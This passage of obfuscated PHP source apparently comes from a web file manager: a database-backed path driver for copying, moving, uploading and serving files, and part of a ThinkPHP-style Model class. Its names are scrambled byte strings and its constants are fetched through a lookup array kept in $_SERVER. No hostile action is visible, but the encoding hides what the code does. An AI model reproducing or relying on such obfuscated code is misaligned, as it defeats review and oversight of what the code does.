$ÑîÕöä®++) { $Ëš¯¬– = $–Ë‡ù“‘[$â¡ĞÑ‡[1375]][$ÑîÕöä®]; if ($ÑîÕöä® == count($–Ë‡ù“‘[$â¡ĞÑ‡[1375]]) - 1) { $Ÿ¢£è— = $this->model->mkfile($Ÿ¢£è—, $Ëš¯¬–, $ö®ÁÑ°Ç, $³¦²¸¿Ó); break; } $Ÿ¢£è— = $this->model->mkdir($Ÿ¢£è—, $Ëš¯¬–, REPEAT_SKIP); } return $this->getPathOuter($Ÿ¢£è—); } public function mkdir($Å£ØšĞ¶, $²³‹›œ = REPEAT_SKIP) { $Æ´şÆÇ =& $_SERVER[•€áå–Õ]; $ƒ¼ˆè¦ = $this->parse($Å£ØšĞ¶); $Å£ØšĞ¶ = $ƒ¼ˆè¦[$Æ´şÆÇ[454]]; for ($óËÖ¦åÀ = 0; $óËÖ¦åÀ < count($ƒ¼ˆè¦[$Æ´şÆÇ[1375]]); $óËÖ¦åÀ++) { $şËÁ™¹Ê = $ƒ¼ˆè¦[$Æ´şÆÇ[1375]][$óËÖ¦åÀ]; $Å£ØšĞ¶ = $this->model->mkdir($Å£ØšĞ¶, $şËÁ™¹Ê, $²³‹›œ); } return $this->getPathOuter($Å£ØšĞ¶); } public function copyFile($û¯‡Ó, $ó¤ÇÄê, $œ…Ï‰†µ = REPEAT_REPLACE) { $Â„ï†ö =& $_SERVER[•€áå–Õ]; $Í–ÔÃÌ = $this->parse($ó¤ÇÄê); $â‘ÕèŸƒ = $this->model->copy($û¯‡Ó, $Í–ÔÃÌ[$Â„ï†ö[454]], $œ…Ï‰†µ, $Í–ÔÃÌ[$Â„ï†ö[96]]); return $â‘ÕèŸƒ ? $this->getPathOuter($â‘ÕèŸƒ) : !1; } public function moveFile($¾½Š­¤Í, $—²³²Öç, $³ùüçÄ = REPEAT_REPLACE) { $û’´Î©Ã =& $_SERVER[•€áå–Õ]; $Üõ‚òƒÕ = $this->parse($—²³²Öç); $í¿Âùúˆ = $this->model->move($¾½Š­¤Í, $Üõ‚òƒÕ[$û’´Î©Ã[454]], $³ùüçÄ, $Üõ‚òƒÕ[$û’´Î©Ã[96]]); return $í¿Âùúˆ ? $this->getPathOuter($í¿Âùúˆ) : !1; } public function copy($ƒÜÅ…¥Œ, $ØÃĞ‘ÙÈ, $™²º£ğş = REPEAT_REPLACE, $®İÛŠ¥ = false) { $£ºİ°÷ª = $this->parse($ØÃĞ‘ÙÈ); $ÕÆÄù¨ = $this->model->copy($ƒÜÅ…¥Œ, $£ºİ°÷ª[$_SERVER[•€áå–Õ][454]], $™²º£ğş, $®İÛŠ¥); return $ÕÆÄù¨ ? $this->getPathOuter($ÕÆÄù¨) : !1; } public function moveSameAllow() { } public function move($ïÙÅá§É, $öñÇÆ¾°, $ğïçŒÊŞ = REPEAT_REPLACE, $ß‹„­ÔÊ = false) { $€•Ÿ÷® = $this->parse($öñÇÆ¾°); $¦‚¬¨á’ = $this->model->move($ïÙÅá§É, $€•Ÿ÷®[$_SERVER[•€áå–Õ][454]], $ğïçŒÊŞ, $ß‹„­ÔÊ); return $¦‚¬¨á’ ? $this->getPathOuter($¦‚¬¨á’) : !1; } public function remove($ŸÍØÅçá, $Ü¶Ïü = true) { return $this->model->remove($ŸÍØÅçá, $Ü¶Ïü); } public function rename($Õ¼¸ÓìÁ, $çÚæñ¦¶) { $Û·ØÓÍ„ = $this->model->rename($Õ¼¸ÓìÁ, $çÚæñ¦¶); return $Û·ØÓÍ„ ? $this->getPathOuter($Õ¼¸ÓìÁ) : $Û·ØÓÍ„; } public function size($í¡÷İŸô) { $—Ü½åâ° = $this->infoSimple($í¡÷İŸô); return $—Ü½åâ° ? $—Ü½åâ°[$_SERVER[•€áå–Õ][88]] : 0; } public function infoSimple($ˆÇÒ¢ÇÀ) { return $this->model->sourceInfo($ˆÇÒ¢ÇÀ); } public function info($ÒëÚí•) { return $this->infoParse($ÒëÚí•); } public function infoAuth($„Í …õ¤) { return $this->infoParse($„Í …õ¤, !1, !0); } public function infoWithChildren($ˆŠı×íŠ) { return $this->infoParse($ˆŠı×íŠ, !0); } protected function infoParse($ºİŸÈ», $½ç£²ÔÀ = false, $çÖÅˆ® = false) { if (!$½ç£²ÔÀ) { return $this->model->pathInfo($ºİŸÈ», $çÖÅˆ®); } return $this->model->pathInfoMore($ºİŸÈ»); } public function infoFullSimple($Ş €îğ­) { $§†Ÿ‡– =& $_SERVER[•€áå–Õ]; $ôˆŒòÁ = explode($§†Ÿ‡–[18], $Ş €îğ­); $¨¨‡È‚ú = implode($§†Ÿ‡–[18], array_splice($ôˆŒòÁ, 1)); return $this->model->pathInfoByPath($ôˆŒòÁ[0], $¨¨‡È‚ú); } public function infoFull($Ğ›Íƒ½¶) { $ÀíšÏ•ˆ = $this->infoFullSimple($Ğ›Íƒ½¶); return is_array($ÀíšÏ•ˆ) ? $this->model->pathInfo($ÀíšÏ•ˆ[$_SERVER[•€áå–Õ][193]]) : !1; } public function hashSimple($¾šİ‰œ¬) { $ƒû³™Á¾ =& $_SERVER[•€áå–Õ]; $üÜ˜ƒ–– = $this->infoWithChildren($¾šİ‰œ¬); return $üÜ˜ƒ––[$ƒû³™Á¾[528]][$ƒû³™Á¾[651]]; } public function hashMd5($´²½‹‹õ) { $Œ›Î‡÷ğ =& $_SERVER[•€áå–Õ]; $ÎÄ‘”ˆƒ = $this->infoWithChildren($´²½‹‹õ); return $ÎÄ‘”ˆƒ[$Œ›Î‡÷ğ[528]][$Œ›Î‡÷ğ[526]]; } public function exist($ïÂù”›) { $ß¯ äş¾ =& $_SERVER[•€áå–Õ]; $³ë÷÷İ = $this->parse($ïÂù”›); if (!$³ë÷÷İ[$ß¯ äş¾[96]]) { return $this->isFile($ïÂù”›) || $this->isFolder($ïÂù”›); } $À ÑÄÅ° = array($ß¯ äş¾[456] => $³ë÷÷İ[$ß¯ äş¾[454]], $ß¯ äş¾[42] => $³ë÷÷İ[$ß¯ äş¾[96]]); $ôÌ¥„Ò = $this->model->where($À ÑÄÅ°)->find(); return $ôÌ¥„Ò ? !0 : !1; } public function isFile($Ü¿¾ãİÌ) { $Ş¨ÁŸ»ü =& $_SERVER[•€áå–Õ]; $ ÛÀŒõä = $this->infoSimple($Ü¿¾ãİÌ); return $ ÛÀŒõä && $ ÛÀŒõä[$Ş¨ÁŸ»ü[464]] == $Ş¨ÁŸ»ü[224] ? !0 : !1; } public function isFolder($ã‰ğ—ÀĞ) { $›ìä‚ =& $_SERVER[•€áå–Õ]; $ÆÌŠù±Ü = $this->infoSimple($ã‰ğ—ÀĞ); return $ÆÌŠù±Ü && $ÆÌŠù±Ü[$›ìä‚[464]] == $›ìä‚[100] ? !0 : !1; } public function listPath($º¶ŞÆ‡, $³Ã¬ŠÑ© = false) { $¼üòşêÏ =& $_SERVER[•€áå–Õ]; if ($º¶ŞÆ‡ == $¼üòşêÏ[22]) { return !1; } $Ã“ôú‚ = array($¼üòşêÏ[456] => $º¶ŞÆ‡); if ($³Ã¬ŠÑ©) { return $this->model->listSource($Ã“ôú‚, -1); } return $this->model->listSource($Ã“ôú‚); } public function has($¿á‘““¿, $í“…á³† = false, $§ŠëË“š = null) { $‚‰ÍÑà =& $_SERVER[•€áå–Õ]; $ããõö”È = $this->infoWithChildren($¿á‘““¿); if ($í“…á³†) { return array($‚‰ÍÑà[236] => $ããõö”È[$‚‰ÍÑà[236]], $‚‰ÍÑà[235] => $ããõö”È[$‚‰ÍÑà[235]]); } return $§ŠëË“š ? $ããõö”È[$‚‰ÍÑà[236]] : $ããõö”È[$‚‰ÍÑà[235]]; } public function listAll($º«ßÓÙŠ) { $¿ëŞ¬Ü = IO::info($this->pathParse[$_SERVER[•€áå–Õ][96]]); if (!$¿ëŞ¬Ü) { return array(); } return $this->model->listAll($º«ßÓÙŠ); } public function getContent($î—…Ñ¦¤) { return $this->model->getContent($î—…Ñ¦¤); } public function setContent($“ñôÀŠÍ, $×ë£ß÷Ø = '') { return $this->model->setContent($“ñôÀŠÍ, $×ë£ß÷Ø); } public function fileSubstr($÷ó°İ÷, $åò¹Ğì×, $›ÖÊ¼–) { return $this->model->fileSubstr($÷ó°İ÷, $åò¹Ğì×, $›ÖÊ¼–); } public function download($›åÎËß, $‹Íâ‰œû = '') { $™’êŞØÂ = get_path_father($‹Íâ‰œû); $©¯ö×ÚÚ = get_path_this($‹Íâ‰œû); $”÷ çÛá = $this->model->fileInfoGet($›åÎËß); $™»£ = IO::copy($”÷ çÛá[$_SERVER[•€áå–Õ][96]], $™’êŞØÂ, !1, $©¯ö×ÚÚ); return $™»£; } public function setModifyTime($…É¾Ğ€é, $ŠÏÄøßŒ = '') { $õìğÓú =& $_SERVER[•€áå–Õ]; if (!$…É¾Ğ€é) { return; } $this->model->where(array($õìğÓú[470] => $…É¾Ğ€é))->save(array($õìğÓú[97] => $ŠÏÄøßŒ)); } public function upload($ñäã‹Ÿ¨, $ñµÅµ§¼, $İ‡¢ú¬ = false, $ñşĞ±Á = REPEAT_REPLACE) { $Ö¨Ò— =& $_SERVER[•€áå–Õ]; $ÜÏµÎƒ = $this->parse($ñäã‹Ÿ¨); $…²ƒøÜ = $this->model->addFile($ÜÏµÎƒ[$Ö¨Ò—[454]], $ñµÅµ§¼, $ÜÏµÎƒ[$Ö¨Ò—[96]], $İ‡¢ú¬, $ñşĞ±Á); return $this->getPathOuter($…²ƒøÜ); } public function uploadFileByID($¶«Œ´ŸÃ, $Øçòğï«, $á¾¸İ‰Õ) { $¿Â¿ã€ =& $_SERVER[•€áå–Õ]; $ÁÉ†•¨ = $this->parse($¶«Œ´ŸÃ); $¹ó«ªÚ = $this->model->addFileByFileID($ÁÉ†•¨[$¿Â¿ã€[454]], $Øçòğï«, $ÁÉ†•¨[$¿Â¿ã€[96]], $á¾¸İ‰Õ); return $this->getPathOuter($¹ó«ªÚ); } public function addFileByRemote($ãĞ­ØŸÅ, $Şô°§µ, $Û£Œ¤© = array(), $Í¢şÎë = '', $Úò­Ğ“„) { $¯®§çÉ =& $_SERVER[•€áå–Õ]; $ğÛ·‘İ¾ = $this->parse($ãĞ­ØŸÅ); $Í¢şÎë = empty($Í¢şÎë) ? $ğÛ·‘İ¾[$¯®§çÉ[96]] : $Í¢şÎë; $Šè—•±ó = $this->model->addFileByRemote($ğÛ·‘İ¾[$¯®§çÉ[454]], $Şô°§µ, $Í¢şÎë, $Û£Œ¤©, $Úò­Ğ“„); return $this->getPathOuter($Šè—•±ó); } public function uploadLink($ÍÂêĞŞë, $×²ÔÙéó = 0) { $ÑŸ¬¾—¸ =& $_SERVER[•€áå–Õ]; $å‰Ú²õ = $this->parse($ÍÂêĞŞë); $ü¬˜€Ø = _get($GLOBALS[$ÑŸ¬¾—¸[17]], $ÑŸ¬¾—¸[1376]); $éˆİÙ£œ = _get($GLOBALS[$ÑŸ¬¾—¸[17]], $ÑŸ¬¾—¸[1377]); $ÍÂêĞŞë = Model($ÑŸ¬¾—¸[653])->createFileName($å‰Ú²õ[$ÑŸ¬¾—¸[96]], $ü¬˜€Ø, $éˆİÙ£œ); return IO::uploadLink($ÍÂêĞŞë, $×²ÔÙéó); } public function fileNameAuto($ÇÕ·ƒŸ›, $à€Ííâ, $Û»âŒí = REPEAT_REPLACE, $Š¬ÊÎêø = false) { return $this->model->fileNameAuto($ÇÕ·ƒŸ›, $à€Ííâ, $Û»âŒí, $Š¬ÊÎêø); } public function fileNameExist($ú±ğ·Ãë, $Ø¯­²·Œ) { return $this->model->fileNameExist($ú±ğ·Ãë, $Ø¯­²·Œ); } protected function _fileOut($•äà»ıù, $ÜÊ¬ú“‹ = false, $¬å›”æ… = false, $ëİ¨†Œ• = '', $¢Ÿ–ˆóõ = false) { $ËöÃŒÏû =& $_SERVER[•€áå–Õ]; $øüõ›Ğå = $this->model->sourceInfo($•äà»ıù); if ($øüõ›Ğå[$ËöÃŒÏû[464]] == $ËöÃŒÏû[100]) { header($ËöÃŒÏû[1378]); die; } $Ï§¨±Ğ = $this->model->fileInfoGet($•äà»ıù); $ëİ¨†Œ• = $Ï§¨±Ğ[$ËöÃŒÏû[526]] ? $Ï§¨±Ğ[$ËöÃŒÏû[526]] : $ëİ¨†Œ•; $÷µèûÏ = is_array($GLOBALS[$ËöÃŒÏû[181]]) ? $GLOBALS[$ËöÃŒÏû[181]][$ËöÃŒÏû[42]] : $øüõ›Ğå[$ËöÃŒÏû[42]]; if ($¢Ÿ–ˆóõ) { return IO::fileOutServer($Ï§¨±Ğ[$ËöÃŒÏû[96]], $ÜÊ¬ú“‹, $÷µèûÏ, $ëİ¨†Œ•); } IO::fileOut($Ï§¨±Ğ[$ËöÃŒÏû[96]], $ÜÊ¬ú“‹, $÷µèûÏ, $ëİ¨†Œ•); } public function fileOut($Æ„è¨Ò, $ÄşºË° = false, $ü¶âàğ = false, $á²„ë = '') { $this->_fileOut($Æ„è¨Ò, $ÄşºË°, $ü¶âàğ, $á²„ë); } public function fileOutServer($ëÃÊÛ£ƒ, $ûËöıİ• = false, $šùã²ºÓ = false, $óåÜ¶€¾ = '') { $this->_fileOut($ëÃÊÛ£ƒ, $ûËöıİ•, $šùã²ºÓ, $óåÜ¶€¾, !0); } protected function _fileOutImage($šÚâ¬Êú, $ÒŸœ½Øå = 250) { $ÆİÎ‡Ô• =& $_SERVER[•€áå–Õ]; $¹¡ŒÊ­ı = $this->model->pathInfo($šÚâ¬Êú); if ($¹¡ŒÊ­ı[$ÆİÎ‡Ô•[464]] == $ÆİÎ‡Ô•[100]) { show_json($ÆİÎ‡Ô•[1379] . $šÚâ¬Êú, !1); } $æ„úóÊ‡ = $this->model->fileInfoGet($šÚâ¬Êú); $¹¡ŒÊ­ı[$ÆİÎ‡Ô•[182]] = $æ„úóÊ‡[$ÆİÎ‡Ô•[96]]; $GLOBALS[$ÆİÎ‡Ô•[181]] = $¹¡ŒÊ­ı; IO::fileOutImage($æ„úóÊ‡[$ÆİÎ‡Ô•[96]], $ÒŸœ½Øå); } public function fileOutImage($¤û—ñğª, $ï÷¦µ‰ç = 250) { $this->_fileOutImage($¤û—ñğª, $ï÷¦µ‰ç); } public function fileOutImageServer($ÔŒû»»¦, $€ë†ØÌğ = 250) { $this->_fileOutImage($ÔŒû»»¦, $€ë†ØÌğ); } public function link($áıöö©Ú, $Êíñ¨Ä´ = '') { $ëßğ Äì = $this->model->fileInfoGet($áıöö©Ú); return IO::link($ëßğ Äì[$_SERVER[•€áå–Õ][96]], $Êíñ¨Ä´); } protected function parse($´àÅ¿ß) { $ŒìÓÕÀ =& $_SERVER[•€áå–Õ]; if (strstr($´àÅ¿ß, $ŒìÓÕÀ[18]) === !1) { return array($ŒìÓÕÀ[472] => intval($´àÅ¿ß), $ŒìÓÕÀ[96] => $ŒìÓÕÀ[22], $ŒìÓÕÀ[1375] => array()); } $Ğ¥öìŠİ = explode($ŒìÓÕÀ[18], trim($´àÅ¿ß, $ŒìÓÕÀ[18])); if (count($Ğ¥öìŠİ) < 2) { show_tips(clear_html($´àÅ¿ß) . $ŒìÓÕÀ[1380]); } return array($ŒìÓÕÀ[472] => intval($Ğ¥öìŠİ[0]), $ŒìÓÕÀ[96] => $Ğ¥öìŠİ[1], $ŒìÓÕÀ[1375] => array_slice($Ğ¥öìŠİ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($½Åİ‘ƒ’) { $this->pathParse = $½Åİ‘ƒ’; $this->model = Model($_SERVER[•€áå–Õ][1374]); } public function getPathOuter($ÏÒÒñ) { $©¿ãÙÃ– =& $_SERVER[•€áå–Õ]; if (!$ÏÒÒñ) { return $ÏÒÒñ; } $Ó¬ÇÏ°– = $this->parse($ÏÒÒñ); return trim(KodIO::makeShare($this->pathParse[$©¿ãÙÃ–[454]], $Ó¬ÇÏ°–[$©¿ãÙÃ–[454]]), $©¿ãÙÃ–[18]); } protected function infoParse($ùä‚ÓŠó, $ñ’¥Õ³ë = false, $Ú«¶ËŠü = false) { $¶İ¤¾²¿ =& $_SERVER[•€áå–Õ]; $˜³±±¾ = $this->pathParse[$¶İ¤¾²¿[454]]; $Çã»Û¶• = trim($this->pathParse[$¶İ¤¾²¿[1209]], $¶İ¤¾²¿[18]); return Action($¶İ¤¾²¿[1381])->sharePathInfo($˜³±±¾, $Çã»Û¶•, $ñ’¥Õ³ë); } public function infoFull($¼í¶È–“) { $õ‹–á¶Û =& $_SERVER[•€áå–Õ]; $¾Ğ™ƒŠ‡ = explode($õ‹–á¶Û[18], trim($¼í¶È–“, $õ‹–á¶Û[18])); if (count($¾Ğ™ƒŠ‡) > 1) { $Öñ™¸éÖ = implode($õ‹–á¶Û[18], array_splice($¾Ğ™ƒŠ‡, 1)); $§—óÍĞñ = $this->model->pathInfoByPath($¾Ğ™ƒŠ‡[0], $Öñ™¸éÖ); if (!$§—óÍĞñ) { return !1; } $this->pathParse[$õ‹–á¶Û[1209]] = $§—óÍĞñ[$õ‹–á¶Û[193]]; } return $this->infoParse($¼í¶È–“); } public function listAll($Ö»¡ê) { $³òÇÓ®¬ =& $_SERVER[•€áå–Õ]; $¥ùÓô  = IO::info($this->pathParse[$³òÇÓ®¬[96]]); if (!$¥ùÓô ) { return array(); } $¬×Ø¹‰• = $this->model->listAll($Ö»¡ê); $½× Öğê = Model($³òÇÓ®¬[643])->getInfo($¥ùÓô [$³òÇÓ®¬[644]]); foreach ($¬×Ø¹‰• as &$ùîº˜Á©) { check_abort(); $ùîº˜Á©[$³òÇÓ®¬[99]] = Action($³òÇÓ®¬[1381])->_shareItemeParse($ùîº˜Á©[$³òÇÓ®¬[99]], $½× Öğê); } unset($ùîº˜Á©); return $¬×Ø¹‰•; } } goto f™ğ¬Ë›Ã; b±«ºù÷Íá: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\144\145\x72", "\141\154\151\141\x73", "\x68\141\166\151\x6e\147", "\x67\x72\157\x75\x70", "\x6c\x6f\143\153", "\144\x69\x73\x74\x69\x6e\143\164", "\141\x75\164\x6f", "\x66\151\154\x74\145\162", "\166\141\154\x69\144\141\164\145", "\162\145\x73\x75\x6c\x74", "\142\x69\156\x64", "\164\x6f\x6b\145\156"); public function __construct($Ñˆ·Àæ = '', $ùü¼‘çÁ = '', $Ç’»†š = '') { $ çûœ«í =& $_SERVER[•€áå–Õ]; $this->_initialize(); if (!empty($Ñˆ·Àæ)) { if (strpos($Ñˆ·Àæ, $ çûœ«í[20])) { list($this->dbName, $this->name) = explode($ çûœ«í[20], $Ñˆ·Àæ); } else { $this->name = $Ñˆ·Àæ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ùü¼‘çÁ)) { $this->tablePrefix = $ çûœ«í[22]; } elseif ($ çûœ«í[22] != $ùü¼‘çÁ) { $this->tablePrefix = $ùü¼‘çÁ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ çûœ«í[299]); } $this->db(0, empty($this->connection) ? $Ç’»†š : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÉÈ±”Ÿß =& $_SERVER[•€áå–Õ]; if (empty($this->fields)) { if (think_config($ÉÈ±”Ÿß[300])) { $¼÷ÔØİ = $this->dbName ? $this->dbName : think_config($ÉÈ±”Ÿß[301]); $®ï¿ùùÉ = think_var_cache($ÉÈ±”Ÿß[302] . strtolower(get_path_this($¼÷ÔØİ) . $ÉÈ±”Ÿß[20] . $this->name)); if ($®ï¿ùùÉ) { $Ò½îè·å = think_config($ÉÈ±”Ÿß[303]); if (empty($Ò½îè·å) || $®ï¿ùùÉ[$ÉÈ±”Ÿß[304]] == $Ò½îè·å) { $this->fields = $®ï¿ùùÉ; return; } } } $this->flush(); } } public function flush() { $’˜ø™Ú =& $_SERVER[•€áå–Õ]; $this->db->setModel($this->name); $Ÿ¦Ö­Êô = $this->db->getFields($this->getTableName()); if (!$Ÿ¦Ö­Êô) { return !1; } $this->fields = array_keys($Ÿ¦Ö­Êô); $this->fields[$’˜ø™Ú[305]] = !1; foreach ($Ÿ¦Ö­Êô as $ÓÉ’½‚¸ => $îòïÜºº) { $ã˜£äÚš[$ÓÉ’½‚¸] = $îòïÜºº[$’˜ø™Ú[43]]; if ($îòïÜºº[$’˜ø™Ú[49]]) { $this->fields[$’˜ø™Ú[306]] = $ÓÉ’½‚¸; if ($îòïÜºº[$’˜ø™Ú[52]]) { $this->fields[$’˜ø™Ú[305]] = !0; } } } $this->fields[$’˜ø™Ú[307]] = $ã˜£äÚš; if (think_config($’˜ø™Ú[303])) { $this->fields[$’˜ø™Ú[304]] = think_config($’˜ø™Ú[303]); } if (think_config($’˜ø™Ú[300])) { $ÛúëÑ ­ = $this->dbName ? $this->dbName : think_config($’˜ø™Ú[301]); think_var_cache($’˜ø™Ú[302] . strtolower(get_path_this($ÛúëÑ ­) . $’˜ø™Ú[20] . $this->name), $this->fields); } } public function switchModel($ƒ¨¹ºÀ, $ºù² ÷Å = array()) { $ŠÍê”‹‡ =& $_SERVER[•€áå–Õ]; $¾‚»±šı = ucwords(strtolower($ƒ¨¹ºÀ)) . $ŠÍê”‹‡[308]; if (!class_exists($¾‚»±šı)) { think_exception($¾‚»±šı . think_lang($ŠÍê”‹‡[309])); } $this->_extModel = new $¾‚»±šı($this->name); if (!empty($ºù² ÷Å)) { foreach ($ºù² ÷Å as $ÁıË´Ó) { $this->_extModel->setProperty($ÁıË´Ó, $this->{$ÁıË´Ó}); } } return $this->_extModel; } public function __set($™ÔÒçüÁ, $Øû‘°œ) { $this->data[$™ÔÒçüÁ] = $Øû‘°œ; } public function __get($²–ÉÀæ“) { return isset($this->data[$²–ÉÀæ“]) ? $this->data[$²–ÉÀæ“] : null; } public function __isset($ûŞ¶™™’) { return isset($this->data[$ûŞ¶™™’]); } public function __unset($·‡¿™¶Œ) { unset($this->data[$·‡¿™¶Œ]); } public function __call($î—™Œ®ª, $ÃºÀ–ä ) { $åçÚã¼÷ =& $_SERVER[•€áå–Õ]; if (in_array(strtolower($î—™Œ®ª), $this->methods, !0)) { $this->options[strtolower($î—™Œ®ª)] = $ÃºÀ–ä [0]; return $this; } elseif (in_array(strtolower($î—™Œ®ª), array($åçÚã¼÷[310], $åçÚã¼÷[311], $åçÚã¼÷[312], $åçÚã¼÷[313], $åçÚã¼÷[314]), !0)) { $µÒ‡ÉÓ» = isset($ÃºÀ–ä [0]) ? $ÃºÀ–ä [0] : $åçÚã¼÷[215]; $µÒ‡ÉÓ» = $this->db->parseKey($µÒ‡ÉÓ»); return $this->getField(strtoupper($î—™Œ®ª) . $åçÚã¼÷[315] . $µÒ‡ÉÓ» . $åçÚã¼÷[316] . $î—™Œ®ª, $åçÚã¼÷[310]); } elseif (strtolower(substr($î—™Œ®ª, 0, 5)) == $åçÚã¼÷[317]) { $µÒ‡ÉÓ» = think_parse_name(substr($î—™Œ®ª, 5)); $³ßÈà[$µÒ‡ÉÓ»] = $ÃºÀ–ä [0]; return $this->where($³ßÈà)->find(); } elseif (strtolower(substr($î—™Œ®ª, 0, 10)) == $åçÚã¼÷[318]) { $û¿®Ú˜Á = think_parse_name(substr($î—™Œ®ª, 10)); $³ßÈà[$û¿®Ú˜Á] = $ÃºÀ–ä [0]; return $this->where($³ßÈà)->getField($ÃºÀ–ä [1]); } elseif (isset($this->_scope[$î—™Œ®ª])) { return $this->scope($î—™Œ®ª, $ÃºÀ–ä [0]); } elseif (method_exists($this, $î—™Œ®ª)) { array_unshift($ÃºÀ–ä , $î—™Œ®ª); return call_user_func_array(array($this, $åçÚã¼÷[319]), $ÃºÀ–ä ); } else { return call_user_func_array(array(parent, $î—™Œ®ª), $ÃºÀ–ä ); } } protected function call() { $Ù·×ÒØ =& $_SERVER[•€áå–Õ]; $‰â¸Î‡ˆ = func_get_args(); $¬½Ø…Ã = array_shift($‰â¸Î‡ˆ); $úÂääå¹ = $¬½Ø…Ã; if (is_array($¬½Ø…Ã)) { $úÂääå¹ = $¬½Ø…Ã[1]; $¬½Ø…Ã = $¬½Ø…Ã[0]; } $áöº®Áá = count($‰â¸Î‡ˆ) - 1; if (isset($‰â¸Î‡ˆ[$áöº®Áá]) && $‰â¸Î‡ˆ[$áöº®Áá] === $¬½Ø…Ã) { think_exception(__CLASS__ . $Ù·×ÒØ[4] . $¬½Ø…Ã . think_lang($Ù·×ÒØ[320])); return; } $‰â¸Î‡ˆ[] = $¬½Ø…Ã; if (method_exists($this, $Ù·×ÒØ[321])) { $Éòæ‹·Ã = call_user_func_array(array($this, $Ù·×ÒØ[322]), array($úÂääå¹, $‰â¸Î‡ˆ)); if (!is_null($Éòæ‹·Ã) && $Éòæ‹·Ã !== !1) { return $Éòæ‹·Ã; } } $–ç™§´“ = call_user_func_array(array($this, $¬½Ø…Ã), $‰â¸Î‡ˆ); if (method_exists($this, $Ù·×ÒØ[323])) { $Éòæ‹·Ã = call_user_func_array(array($this, $Ù·×ÒØ[324]), array($úÂääå¹, $‰â¸Î‡ˆ, $–ç™§´“)); if ($Éòæ‹·Ã) { return $Éòæ‹·Ã; } } return $–ç™§´“; } protected function _initialize() { } protected function _facade($¡úÍùÄ§) { $ÉşÊŞİ‡ =& $_SERVER[•€áå–Õ]; if (!empty($this->fields)) { foreach ($¡úÍùÄ§ as $†ó·©Ë± => $ßëİ…§) { if (is_array($this->fields) && !in_array($†ó·©Ë±, $this->fields, !0)) { unset($¡úÍùÄ§[$†ó·©Ë±]); } elseif (is_scalar($ßëİ…§)) { $this->_parseType($¡úÍùÄ§, $†ó·©Ë±); } } } if (!empty($this->options[$ÉşÊŞİ‡[325]])) { $¡úÍùÄ§ = array_map($this->options[$ÉşÊŞİ‡[325]], $¡úÍùÄ§); unset($this->options[$ÉşÊŞİ‡[325]]); } $this->_beforeWrite($¡úÍùÄ§); return $¡úÍùÄ§; } protected function _beforeWrite(&$ªòŞàˆÁ) { } public function add($šÂì¡Õµ = '', $†éî´€Ø = array(), $˜ Åû = false) { if (empty($šÂì¡Õµ)) { if (!empty($this->data)) { $šÂì¡Õµ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[•€áå–Õ][326]); return !1; } } $†éî´€Ø = $this->_parseOptions($†éî´€Ø); $šÂì¡Õµ = $this->_facade($šÂì¡Õµ); if (!1 === $this->_beforeInsert($šÂì¡Õµ, $†éî´€Ø)) { return !1; } $°ª×Ïí¤ = $this->db->insert($šÂì¡Õµ, $†éî´€Ø, $˜ Åû); if (!1 !== $°ª×Ïí¤) { $³¿°Âİ– = $this->getLastInsID(); if ($³¿°Âİ–) { $šÂì¡Õµ[$this->getPk()] = $³¿°Âİ–; $this->_after_insert($šÂì¡Õµ, $†éî´€Ø); return $³¿°Âİ–; } $this->_after_insert($šÂì¡Õµ, $†éî´€Ø); } return $°ª×Ïí¤; } protected function _beforeInsert(&$úÒò‹œÇ, $òş‹™àù) { } protected function _after_insert($Æı²‡˜š, $½À·½€¤) { } public function addAll($—şÑˆ·é, $¢Ôê¿ŠØ = array(), $ƒ¡¼éƒÙ = false) { $…Ì†É» =& $_SERVER[•€áå–Õ]; if (empty($—şÑˆ·é)) { $this->error = think_lang($…Ì†É»[326]); return !1; } $¢Ôê¿ŠØ = $this->_parseOptions($¢Ôê¿ŠØ); foreach ($—şÑˆ·é as $şÑ§¬÷¯ => $‰Á®æ¥) { $—şÑˆ·é[$şÑ§¬÷¯] = $this->_facade($‰Á®æ¥); } if (method_exists($this->db, $…Ì†É»[327])) { $¡˜²íàô = $this->db->insertAll($—şÑˆ·é, $¢Ôê¿ŠØ, $ƒ¡¼éƒÙ); } else { $this->startTrans(); foreach ($—şÑˆ·é as $şÑ§¬÷¯ => $‰Á®æ¥) { $¡˜²íàô = $this->db->insert($‰Á®æ¥, $¢Ôê¿ŠØ, $ƒ¡¼éƒÙ); } $this->commit(); } if (!1 !== $¡˜²íàô) { $»ùåÂ½… = $this->getLastInsID(); if ($»ùåÂ½…) { return $»ùåÂ½…; } } return $¡˜²íàô; } public function selectAdd($Š”–Ñ­Â = '', $ıÜ“§·ñ = '', $¬ƒíÊëñ = array()) { $Å²ŞÒ‰ˆ =& $_SERVER[•€áå–Õ]; $¬ƒíÊëñ = $this->_parseOptions($¬ƒíÊëñ); if (!1 === ($š²Êºéî = $this->db->selectInsert($Š”–Ñ­Â ? $Š”–Ñ­Â : $¬ƒíÊëñ[$Å²ŞÒ‰ˆ[328]], $ıÜ“§·ñ ? $ıÜ“§·ñ : $this->getTableName(), $¬ƒíÊëñ))) { $this->error = think_lang($Å²ŞÒ‰ˆ[329]); return !1; } else { return $š²Êºéî; } } public function save($›ƒ÷˜³ñ = '', $¥éÛÛÓÊ = array()) { $ô¨“¹Õ =& $_SERVER[•€áå–Õ]; if (empty($›ƒ÷˜³ñ)) { if (!empty($this->data)) { $›ƒ÷˜³ñ = $this->data; $this->data = array(); } else { $this->error = think_lang($ô¨“¹Õ[326]); return !1; } } $›ƒ÷˜³ñ = $this->_facade($›ƒ÷˜³ñ); $¥éÛÛÓÊ = $this->_parseOptions($¥éÛÛÓÊ); $ŠÈ¡ÈçÄ = $this->getPk(); if (!isset($¥éÛÛÓÊ[$ô¨“¹Õ[330]])) { if (isset($›ƒ÷˜³ñ[$ŠÈ¡ÈçÄ])) { $Ø½ã»î‡[$ŠÈ¡ÈçÄ] = 